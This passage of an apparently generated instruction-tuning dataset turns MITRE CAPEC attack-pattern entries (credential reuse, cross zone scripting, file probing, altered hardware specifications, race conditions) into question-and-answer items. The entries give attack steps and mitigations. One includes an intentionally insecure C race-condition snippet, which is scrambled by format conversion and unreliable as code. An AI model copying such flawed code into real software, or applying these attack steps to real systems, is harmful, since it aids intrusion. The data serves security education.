    "output": "Sure. Examples can be: Throughout 2015 and 2016, APT28 \u2014 also known as Pawn Storm, Sednit, Fancy Bear, Sofacy, and STRONTIUM \u2014 leveraged stolen credentials to infiltrate the Democratic National Committee (DNC), the United States Army, the World Anti-Doping Agency (WADA), the Court of Arbitration for Sport (TAS-CAS), and more. In most cases, the legitimate credentials were obtained via calculated spearphishing, tabnabbing, and DNS attacks targeted at corporate webmail systems. APT28 also executed several watering hole attacks, in addition to exploiting several zero-day vulnerabilities within Flash and Windows. The stolen credentials were then utilized to maintain authenticated access, laterally move within the local network, and exfiltrate sensitive information including DNC emails and personal medical records of numerous athletes. [REF-571]\n- In early 2019, FIN6 exploited stolen credentials from an organization within the engineering industry to laterally move within an environment via the Windows\u2019 Remote Desktop Protocol (RDP). Multiple servers were subsequently infected with malware to create malware distribution servers, which were used to distribute the LockerGoga ransomware. [REF-573]",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Throughout 2015 and 2016, APT28 \u2014 also known as Pawn Storm, Sednit, Fancy Bear, Sofacy, and STRONTIUM \u2014 leveraged stolen credentials to infiltrate the Democratic National Committee (DNC), the United States Army, the World Anti-Doping Agency (WADA), the Court of Arbitration for Sport (TAS-CAS), and more. In most cases, the legitimate credentials were obtained via calculated spearphishing, tabnabbing, and DNS attacks targeted at corporate webmail systems. APT28 also executed several watering hole attacks, in addition to exploiting several zero-day vulnerabilities within Flash and Windows. The stolen credentials were then utilized to maintain authenticated access, laterally move within the local network, and exfiltrate sensitive information including DNC emails and personal medical records of numerous athletes. [REF-571]",
        "In early 2019, FIN6 exploited stolen credentials from an organization within the engineering industry to laterally move within an environment via the Windows\u2019 Remote Desktop Protocol (RDP). Multiple servers were subsequently infected with malware to create malware distribution servers, which were used to distribute the LockerGoga ransomware. [REF-573]"
      ],
      "@Name": "Use of Known Domain Credentials (CAPEC ID: 560)",
      "attack_ptrn": {
        "@ID": "560",
        "@Name": "Use of Known Domain Credentials",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": "An adversary guesses or obtains (i.e. steals or purchases) legitimate credentials (e.g. userID/password) to achieve authentication and to perform authorized actions under the guise of an authenticated user or service."
        },
        "Extended_Description": {
          "xhtml:p": [
            "Attacks leveraging trusted credentials typically result in the adversary laterally moving within the local network, since users are often allowed to login to systems/applications within the network using the same password. This further allows the adversary to obtain sensitive data, download/install malware on the system, pose as a legitimate user for social engineering purposes, and more.",
            "Attacks on known passwords generally rely on the primary fact that users often reuse the same username/password combination for a variety of systems, applications, and services, coupled with poor password policies on the target system or application. Adversaries can also utilize known passwords to target Single Sign On (SSO) or cloud-based applications and services, which often don't verify the authenticity of the user's input. Known credentials are usually obtained by an adversary via a system/application breach and/or by purchasing dumps of credentials on the dark web. These credentials may be further gleaned via exposed configuration and properties files that contain system passwords, database connection strings, and other sensitive data."
          ]
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "CanPrecede",
            "@CAPEC_ID": "151"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Acquire known credentials] The adversary must obtain known credentials in order to access the target system, application, or service.",
              "Technique": [
                "An adversary purchases breached username/password combinations or leaked hashed passwords from the dark web.",
                "An adversary leverages a key logger or phishing attack to steal user credentials as they are provided.",
                "An adversary conducts a sniffing attack to steal credentials as they are transmitted.",
                "An adversary gains access to a database and exfiltrates password hashes.",
                "An adversary examines outward-facing configuration and properties files to discover hardcoded credentials."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Determine target's password policy] Determine the password policies of the target system/application to determine if the known credentials fit within the specified criteria.",
              "Technique": [
                "Determine minimum and maximum allowed password lengths.",
                "Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).",
                "Determine account lockout policy (a strict account lockout policy will prevent brute force attacks if multiple passwords are known for a single user account)."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Attempt authentication] Try each credential until the target grants access.",
              "Technique": "Manually or automatically enter each credential through the target's interface."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within a system or application"
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Spoofing] Malicious data can be injected into the target system or into a victim user's system by an adversary. The adversary can also pose as a legitimate user to perform social engineering attacks."
            },
            {
              "Step": "6",
              "Phase": "Exploit",
              "Description": "[Data Exfiltration] The adversary can obtain sensitive data contained within the system or application."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The system/application uses one factor password based authentication, SSO, and/or cloud-based authentication.",
            "The system/application does not have a sound password policy that is being enforced.",
            "The system/application does not implement an effective password throttling mechanism.",
            "The adversary possesses a list of known user accounts and corresponding passwords that may exist on the target."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Once an adversary obtains a known credential, leveraging it is trivial."
          }
        },
        "Resources_Required": {
          "Resource": [
            "A list of known credentials.",
            "A custom script that leverages the credential list to launch an attack."
          ]
        },
        "Indicators": {
          "Indicator": [
            "Authentication attempts use credentials that have been used previously by the account in question.",
            "Authentication attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations.",
            "Data is being transferred and/or removed from systems/applications within the network.",
            "Suspicious or Malicious software is downloaded/installed on systems within the domain.",
            "Messages from a legitimate user appear to contain suspicious links or communications not consistent with the user's normal behavior."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authentication"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Authorization"
              ],
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.",
            "Create a strong password policy and ensure that your system enforces this policy.",
            "Ensure users are not reusing username/password combinations for multiple systems, applications, or services.",
            "Do not reuse local administrator account credentials across systems.",
            "Deny remote use of local admin credentials to log into domain systems.",
            "Do not allow accounts to be a local administrator on more than one system.",
            "Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.",
            "Monitor system and domain logs for abnormal credential access."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Throughout 2015 and 2016, APT28 \u2014 also known as Pawn Storm, Sednit, Fancy Bear, Sofacy, and STRONTIUM \u2014 leveraged stolen credentials to infiltrate the Democratic National Committee (DNC), the United States Army, the World Anti-Doping Agency (WADA), the Court of Arbitration for Sport (TAS-CAS), and more. In most cases, the legitimate credentials were obtained via calculated spearphishing, tabnabbing, and DNS attacks targeted at corporate webmail systems. APT28 also executed several watering hole attacks, in addition to exploiting several zero-day vulnerabilities within Flash and Windows. The stolen credentials were then utilized to maintain authenticated access, laterally move within the local network, and exfiltrate sensitive information including DNC emails and personal medical records of numerous athletes. [REF-571]",
            "In early 2019, FIN6 exploited stolen credentials from an organization within the engineering industry to laterally move within an environment via the Windows\u2019 Remote Desktop Protocol (RDP). Multiple servers were subsequently infected with malware to create malware distribution servers, which were used to distribute the LockerGoga ransomware. [REF-573]"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "522"
            },
            {
              "@CWE_ID": "307"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "654"
            },
            {
              "@CWE_ID": "1273"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1078",
            "Entry_Name": "Valid Accounts"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-570"
            },
            {
              "@External_Reference_ID": "REF-571"
            },
            {
              "@External_Reference_ID": "REF-572"
            },
            {
              "@External_Reference_ID": "REF-573"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated @Abstraction, @Status, Consequences, Description, Example_Instances, Execution_Flow, Indicators, Likelihood_Of_Attack, Mitigations, Prerequisites, References, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Skills_Required, Taxonomy_Mappings, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Extended_Description, Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Cross Zone Scripting (CAPEC ID: 104)",
    "context": "",
    "output": "Examples of Cross Zone Scripting (CAPEC ID: 104) are: There was a cross zone scripting vulnerability discovered in Skype that allowed one user to upload a video with a maliciously crafted title that contains a script. Subsequently, when the victim attempts to use the \"add video to chat\" feature on attacker's video, the script embedded in the title of the video runs with local zone privileges. Skype is using IE web controls to render internal and external HTML pages. \"Add video to chat\" uses these web controls and they are running in the Local Zone. Any user who searched for the video in Skype with the same keywords as in the title field, would have the attackers' code executing in their browser with local zone privileges to their host machine (e.g. applications on the victim's host system could be executed).",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "There was a cross zone scripting vulnerability discovered in Skype that allowed one user to upload a video with a maliciously crafted title that contains a script. Subsequently, when the victim attempts to use the \"add video to chat\" feature on attacker's video, the script embedded in the title of the video runs with local zone privileges. Skype is using IE web controls to render internal and external HTML pages. \"Add video to chat\" uses these web controls and they are running in the Local Zone. Any user who searched for the video in Skype with the same keywords as in the title field, would have the attackers' code executing in their browser with local zone privileges to their host machine (e.g. applications on the victim's host system could be executed).",
      "@Name": "Cross Zone Scripting (CAPEC ID: 104)",
      "attack_ptrn": {
        "@ID": "104",
        "@Name": "Cross Zone Scripting",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker is able to cause a victim to load content into their web-browser that bypasses security zone controls and gain access to increased privileges to execute scripting code or other web objects such as unsigned ActiveX controls or applets. This is a privilege elevation attack targeted at zone-based web-browser security.",
        "Extended_Description": {
          "xhtml:p": "In a zone-based model, pages belong to one of a set of zones corresponding to the level of privilege assigned to that page. Pages in an untrusted zone would have a lesser level of access to the system and/or be restricted in the types of executable content it was allowed to invoke. In a cross-zone scripting attack, a page that should be assigned to a less privileged zone is granted the privileges of a more trusted zone. This can be accomplished by exploiting bugs in the browser, exploiting incorrect configuration in the zone controls, through a cross-site scripting attack that causes the attackers' content to be treated as coming from a more trusted page, or by leveraging some piece of system functionality that is accessible from both the trusted and less trusted zone. This attack differs from \"Restful Privilege Escalation\" in that the latter correlates to the inadequate securing of RESTful access methods (such as HTTP DELETE) on the server, while cross-zone scripting attacks the concept of security zones as implemented by a browser."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "233",
            "Exclude_Related": {
              "@Exclude_ID": "515"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Find systems susceptible to the attack] Find systems that contain functionality that is accessed from both the internet zone and the local zone. There needs to be a way to supply input to that functionality from the internet zone and that original input needs to be used later on a page from a local zone.",
              "Technique": "Leverage knowledge of common local zone functionality on targeted platforms to guide attempted injection of code through relevant internet zone mechanisms. In some cases this may be due to standard system configurations enabling shared functionality between internet and local zones. The attacker can search for indicators that these standard configurations are in place."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Find the insertion point for the payload] The attacker first needs to find some system functionality or possibly another weakness in the system (e.g. susceptibility to cross site scripting) that would provide the attacker with a mechanism to deliver the payload (i.e. the code to be executed) to the user. The location from which this code is executed in the user's browser needs to be within the local machine zone.",
              "Technique": "Finding weaknesses in functionality used by both privileged and unprivileged users."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Craft and inject the payload] Develop the payload to be executed in the higher privileged zone in the user's browser. Inject the payload and attempt to lure the victim (if possible) into executing the functionality which unleashes the payload.",
              "Technique": [
                "The attacker makes it as likely as possible that the vulnerable functionality into which they have injected the payload has a high likelihood of being used by the victim.",
                "Leverage cross-site scripting vulnerability to inject payload."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The target must be using a zone-aware browser."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Ability to craft malicious scripts or find them elsewhere and ability to identify functionality that is running web controls in the local zone and to find an injection vector into that functionality"
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Disable script execution.",
            "Ensure that sufficient input validation is performed for any potentially untrusted data before it is used in any privileged context or zone",
            "Limit the flow of untrusted data into the privileged areas of the system that run in the higher trust zone",
            "Limit the sites that are being added to the local machine zone and restrict the privileges of the code running in that zone to the bare minimum",
            "Ensure proper HTML output encoding before writing user supplied data to the page"
          ]
        },
        "Example_Instances": {
          "Example": "There was a cross zone scripting vulnerability discovered in Skype that allowed one user to upload a video with a maliciously crafted title that contains a script. Subsequently, when the victim attempts to use the \"add video to chat\" feature on attacker's video, the script embedded in the title of the video runs with local zone privileges. Skype is using IE web controls to render internal and external HTML pages. \"Add video to chat\" uses these web controls and they are running in the Local Zone. Any user who searched for the video in Skype with the same keywords as in the title field, would have the attackers' code executing in their browser with local zone privileges to their host machine (e.g. applications on the victim's host system could be executed)."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "250"
            },
            {
              "@CWE_ID": "638"
            },
            {
              "@CWE_ID": "285"
            },
            {
              "@CWE_ID": "116"
            },
            {
              "@CWE_ID": "20"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Probe System Files (CAPEC ID: 639), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n* Adversaries may search network shares on computers they have compromised to find files of interest.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.",
        "Adversaries may search network shares on computers they have compromised to find files of interest."
      ],
      "@Name": "Probe System Files (CAPEC ID: 639)",
      "attack_ptrn": {
        "@ID": "639",
        "@Name": "Probe System Files",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary obtains unauthorized information due to improperly protected files. If an application stores sensitive information in a file that is not protected by proper access control, then an adversary can access the file and search for sensitive information.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "545",
            "Exclude_Related": {
              "@Exclude_ID": "515"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "An adversary has access to the file system of a system."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": "Verify that files have proper access controls set, and reduce the storage of sensitive information to only what is necessary."
        },
        "Example_Instances": {
          "Example": [
            "Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.",
            "Adversaries may search network shares on computers they have compromised to find files of interest."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "552"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1039",
              "Entry_Name": "Data from Network Shared Drive"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1552.001",
              "Entry_Name": "Unsecured Credentials: Credentials in Files"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1552.003",
              "Entry_Name": "Unsecured Credentials: Bash History"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1552.004",
              "Entry_Name": "Unsecured Credentials: Private Keys"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1552.006",
              "Entry_Name": "Unsecured Credentials: Group Policy Preferences"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2018-05-04"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Hardware Design Specifications Are Altered (CAPEC ID: 521)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: To operate at full capability, a manufacturer's network intrusion detection device needs to have either a Intel Xeon E7-2820 or AMD FX-8350 which have 8 \"cores\" available, allowing for advanced threading needed to handle large volumes of network traffic without resorting to dropping packets from the detection process. The attacker alters the documentation to state that the system design must use the Intel Core Duo or the AMD Phenom II X2, which only have 2 cores, causing the system to drop large amounts of packets during deployment at a victim site with large amounts of network traffic.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "To operate at full capability, a manufacturer's network intrusion detection device needs to have either a Intel Xeon E7-2820 or AMD FX-8350 which have 8 \"cores\" available, allowing for advanced threading needed to handle large volumes of network traffic without resorting to dropping packets from the detection process. The attacker alters the documentation to state that the system design must use the Intel Core Duo or the AMD Phenom II X2, which only have 2 cores, causing the system to drop large amounts of packets during deployment at a victim site with large amounts of network traffic.",
      "@Name": "Hardware Design Specifications Are Altered (CAPEC ID: 521)",
      "attack_ptrn": {
        "@ID": "521",
        "@Name": "Hardware Design Specifications Are Altered",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker with access to a manufacturer's hardware manufacturing process documentation alters the design specifications, which introduces flaws advantageous to the attacker once the system is deployed.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "447"
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "Advanced knowledge of hardware capabilities of a manufacturer's product.",
            "Access to the manufacturer's documentation."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "Ability to read, interpret, and subsequently alter manufacturer's documentation to cause errors in design specifications."
            },
            {
              "@Level": "High",
              "#text": "Ability to stealthly gain access via remote compromise or physical access to the manufacturer's documentation."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Digitize documents and cryptographically sign them to verify authenticity.",
            "Password protect documents and make them read-only for unauthorized users.",
            "Avoid emailing important documents and configurations.",
            "Ensure deleted files are actually deleted.",
            "Maintain backups of the document for recovery and verification.",
            "Separate need-to-know information from system configuration information depending on the user."
          ]
        },
        "Example_Instances": {
          "Example": "To operate at full capability, a manufacturer's network intrusion detection device needs to have either a Intel Xeon E7-2820 or AMD FX-8350 which have 8 \"cores\" available, allowing for advanced threading needed to handle large volumes of network traffic without resorting to dropping packets from the detection process. The attacker alters the documentation to state that the system design must use the Intel Core Duo or the AMD Phenom II X2, which only have 2 cores, causing the system to drop large amounts of packets during deployment at a victim site with large amounts of network traffic."
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-439"
            },
            {
              "@External_Reference_ID": "REF-715"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Mitigations, References"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Leveraging Race Conditions (CAPEC ID: 26)",
    "context": "",
    "output": "The Net Direct client for Linux before 6.0.5 in Nortel Application Switch 2424, VPN 3050 and 3070, and SSL VPN Module 1000 extracts and executes files with insecure permissions, which allows local users to exploit a race condition to replace a world-writable file in /tmp/NetClient and cause another user to execute arbitrary code when attempting to execute this client, as demonstrated by replacing /tmp/NetClient/client. See also: CVE-2007-1057",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "The Net Direct client for Linux before 6.0.5 in Nortel Application Switch 2424, VPN 3050 and 3070, and SSL VPN Module 1000 extracts and executes files with insecure permissions, which allows local users to exploit a race condition to replace a world-writable file in /tmp/NetClient and cause another user to execute arbitrary code when attempting to execute this client, as demonstrated by replacing /tmp/NetClient/client. See also: CVE-2007-1057"
      ],
      "@Name": "Leveraging Race Conditions (CAPEC ID: 26)",
      "attack_ptrn": {
        "@ID": "26",
        "@Name": "Leveraging Race Conditions",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "The adversary targets a race condition occurring when multiple processes access and manipulate the same resource concurrently, and the outcome of the execution depends on the particular order in which the access takes place. The adversary can leverage a race condition by \"running the race\", modifying the resource and modifying the normal execution flow. For instance, a race condition can occur while accessing a file: the adversary can trick the system by replacing the original file with their version and cause the system to read the malicious file.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "The adversary explores to gauge what level of access they have."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "The adversary gains access to a resource on the target host. The adversary modifies the targeted resource. The resource's value is used to determine the next normal execution action."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "The resource is modified/checked concurrently by multiple processes. By using one of the processes, the adversary is able to modify the value just before it is consumed by a different process. A race condition occurs and is exploited by the adversary to abuse the target host."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "A resource is accessed/modified concurrently by multiple processes such that a race condition exists.",
            "The adversary has the ability to modify the resource."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Being able to \"run the race\" requires basic knowledge of concurrent processing including synchonization techniques."
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Use safe libraries to access resources such as files.",
            "Be aware that improper use of access function calls such as chown(), tempfile(), chmod(), etc. can cause a race condition.",
            "Use synchronization to control the flow of execution.",
            "Use static analysis tools to find race conditions.",
            "Pay attention to concurrency problems related to the access of resources."
          ]
        },
        "Example_Instances": {
          "Example": [
            "The Net Direct client for Linux before 6.0.5 in Nortel Application Switch 2424, VPN 3050 and 3070, and SSL VPN Module 1000 extracts and executes files with insecure permissions, which allows local users to exploit a race condition to replace a world-writable file in /tmp/NetClient and cause another user to execute arbitrary code when attempting to execute this client, as demonstrated by replacing /tmp/NetClient/client. See also: CVE-2007-1057",
            {
              "xhtml:p": "The following code illustrates a file that is accessed multiple times by name in a publicly accessible directory. A race condition exists between the accesses where an attacker can replace the file referenced by the name (see [REF-107]).",
              "xhtml:div": {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "xhtml:br": [
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null
                ],
                "xhtml:div": [
                  {
                    "@style": "margin-left:1em;",
                    "xhtml:br": [
                      null,
                      null,
                      null,
                      null
                    ],
                    "xhtml:div": {
                      "@style": "margin-left:1em;",
                      "#text": "return;"
                    },
                    "#text": "int fd;fd = creat(FILE, 0644);if(fd == -1)\n                     chown(FILE, UID, -1); /* BAD */close(fd);"
                  },
                  {
                    "@style": "margin-left:1em;",
                    "xhtml:br": [
                      null,
                      null,
                      null
                    ],
                    "xhtml:div": {
                      "@style": "margin-left:1em;",
                      "xhtml:br": null,
                      "#text": "userstr = argv[1];test(userstr);"
                    },
                    "#text": "char *userstr;if(argc > 1) {\n                     }return 0;"
                  }
                ],
                "#text": "include <sys/types.h>include <fcntl.h>include <unistd.h>\n                  define FILE \"/tmp/myfile\"define UID 100\n                  void test(char *str){\n                  }\n                  int main(int argc, char **argv){\n                  }"
              }
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "368"
            },
            {
              "@CWE_ID": "363"
            },
            {
              "@CWE_ID": "366"
            },
            {
              "@CWE_ID": "370"
            },
            {
              "@CWE_ID": "362"
            },
            {
              "@CWE_ID": "662"
            },
            {
              "@CWE_ID": "689"
            },
            {
              "@CWE_ID": "667"
            },
            {
              "@CWE_ID": "665"
            },
            {
              "@CWE_ID": "1223"
            },
            {
              "@CWE_ID": "1254"
            },
            {
              "@CWE_ID": "1298"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-1"
            },
            {
              "@External_Reference_ID": "REF-105",
              "@Section": "Race condition"
            },
            {
              "@External_Reference_ID": "REF-106"
            },
            {
              "@External_Reference_ID": "REF-107",
              "@Section": "Test Case ID 1598"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns, Type (Relationship -> Attack_Pattern)"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Activation_Zone, Attack_Phases, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
